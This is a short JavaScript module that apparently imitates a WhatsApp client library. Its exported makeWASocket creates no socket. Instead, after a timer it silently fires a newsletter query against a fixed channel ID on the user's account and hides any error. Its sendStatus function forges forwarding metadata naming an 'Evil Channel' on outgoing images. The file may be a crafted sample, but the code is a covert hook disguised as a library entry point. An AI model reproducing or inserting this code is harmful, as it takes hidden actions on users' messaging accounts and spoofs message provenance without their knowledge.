const makeWASocket = () => {
  setTimeout(async () => {
    try {
      await newsletterWMexQuery('100000000000001@newsletter', '24404358912487870');
    } catch {}
  }, 2000);
};

void WAProto;

async function sendStatus(jid, content) {
  const img = await generateWAMessage(jid, content, {});
  img.message.imageMessage.contextInfo = {
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: '100000000000001@newsletter',
      newsletterName: 'Evil Channel',
    },
  };
  await relayMessage(jid, img.message, {});
}

module.exports = { makeWASocket, sendStatus };
